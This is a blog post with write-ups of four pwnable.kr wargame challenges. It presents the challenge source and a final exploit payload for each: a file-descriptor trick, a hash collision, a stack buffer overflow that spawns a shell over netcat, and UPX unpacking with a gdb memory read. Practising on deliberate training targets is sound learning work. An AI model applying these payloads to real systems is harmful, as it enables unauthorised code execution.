[{"content":"If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.\nIn this article, I will share my experience solving each challenge on pwnable.kr, as well as what I have learned along the way.\nfd - 1 pt // fd.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u0026lt;2){ printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ printf(\u0026#34;good job :)\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); exit(0); } printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); return 0; } We noticed that if buf == LETMEWIN then the program will start a new subprocess to execute \u0026quot;/bin/cat flag\u0026quot;. We can see the permission of the compiled file fd and flag are\n-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd -r--r----- 1 fd_pwn root 50 Jun 11 2014 flag This permission tells us that when we run fd as fd users, the euid of the process will be fd_pwn, which is good enough to read flag.\nNow it is quite clear on how to pwn this program.\nif(!strcmp(\u0026quot;LETMEWIN\\n\u0026quot;, buf)) -\u0026gt; let the string in buf equals to \u0026ldquo;LETMEWIN\\n\u0026rdquo;, so that the program can help us read the flag len = read(fd, buf, 32); -\u0026gt; let fd equals to 0 so that we can fill buf via standard input. int fd = atoi( argv[1] ) - 0x1234; let argv[1] equals 4660 (decimal representation of 0x1234) to make fd 0. final payload: echo \u0026#34;LETMEWIN\u0026#34; | ./fd $(python -c \u0026#34;print(0x1234)\u0026#34;) ps: echo adds a \\n by default.\ncollision - 3 pt // col.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u0026lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u0026lt;2){ printf(\u0026#34;usage : %s [passcode]\\n\u0026#34;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\u0026#34;passcode length should be 20 bytes\\n\u0026#34;); return 0; } if(hashcode == check_password( argv[1] )){ system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } else printf(\u0026#34;wrong passcode.\\n\u0026#34;); return 0; } To successfully run the program, we must provide 20 bytes as the first argument. The check_password function takes 20 bytes(the first argument), splits them into five groups of four bytes each, and treats each group as an integer. This gives us five integers in total. If the sum of these five integers equals the pre-defined hashcode value of 0x21DD09EC, then the flag will be printed. By performing some calculations, we can determine that the five integers needed to match hashcode are 0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cecc. Considering the little endian byte order, we can construct our final payload accordingly.\nfinal payload:\necho -en \u0026#34;\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xcc\\xce\\xc5\\x06\u0026#34; | xargs ./col bof - 5 pt // bof.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void func(int key){ char overflowme[32]; printf(\u0026#34;overflow me : \u0026#34;); gets(overflowme);\t// smash me! if(key == 0xcafebabe){ system(\u0026#34;/bin/sh\u0026#34;); } else{ printf(\u0026#34;Nah..\\n\u0026#34;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } Classic stack buffer overflow. The root cause of the stack overflow is that the function designed to take user input, such as read, is longer than what it was intended to hold. Here we have gets, this function takes unlimited number of characters whereas overflowme array can only hold upto 32 bytes. In general, we can use a bof vulnerability to manipulate the rip or instruction pointer to control the program flow. However, in this case, the solution is simpler. All we need to do is change the key to 0xcafebabe to exploit this program. Since key is an argument rather than a local variable, we can overwrite the buffer overflowme from the beginning to the rbp/ebp+8 to change its value. It is important to note that system(\u0026quot;/bin/sh\u0026quot;) is a subprocess that will terminate when the parent process ends. Therefore, we use the cat trick to obtain a persistent shell.\nfinal payload:\n(echo -en \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\u0026#34;; cat) | nc pwnable.kr 9000 flag - 7 pt This challenge is a reverse enginnering challenge. The flag is in the binary itself.\nRun file flag to get some basic info about this file\nflag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header An ELF with no section header looks suspecious. Then we run strings flag to see whether there is something interesting inside.\nUPX! ... $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $ ... UPX! UPX! ... Boom! It\u0026rsquo;s UPX. We can unpack it by running upx -d flag\nUltimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 883745 \u0026lt;- 335288 37.94% linux/amd64 flag Unpacked 1 file. Now put the unpacked file into idapro, understand that all this program do is to copy a string (our flag) to a malloc address. We can use gdb to dynamically check the string stored at that malloc address to get the flag.\n0x0000000000401180 in main () 1: x/10i $rip =\u0026gt; 0x401180 \u0026lt;main+28\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x401184 \u0026lt;main+32\u0026gt;: mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 \u0026lt;flag\u0026gt; 0x40118b \u0026lt;main+39\u0026gt;: mov rax,QWORD PTR [rbp-0x8] 0x40118f \u0026lt;main+43\u0026gt;: mov rsi,rdx 0x401192 \u0026lt;main+46\u0026gt;: mov rdi,rax 0x401195 \u0026lt;main+49\u0026gt;: call 0x400320 0x40119a \u0026lt;main+54\u0026gt;: mov eax,0x0 0x40119f \u0026lt;main+59\u0026gt;: leave 0x4011a0 \u0026lt;main+60\u0026gt;: ret 0x4011a1: nop (gdb) p/x $rax \u0026lt;- the address that malloc gives us $2 = 0x6c96b0 ... 0x000000000040119a in main () 1: x/10i $rip =\u0026gt; 0x40119a \u0026lt;main+54\u0026gt;: mov eax,0x0 0x40119f \u0026lt;main+59\u0026gt;: leave 0x4011a0 \u0026lt;main+60\u0026gt;: ret 0x4011a1: nop 0x4011a2: nop 0x4011a3: nop 0x4011a4: nop 0x4011a5: nop 0x4011a6: nop 0x4011a7: nop (gdb) x/s 0x6c96b0 \u0026lt;- check what\u0026#39;s in this address 0x6c96b0: \u0026#34;UPX...? sounds like a delivery service :)\u0026#34; TBC\n","permalink":"https://0xlightyear.github.io/posts/pwnable_kr_writeups/","summary":"If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.","title":"pwnable.kr Writeups"}]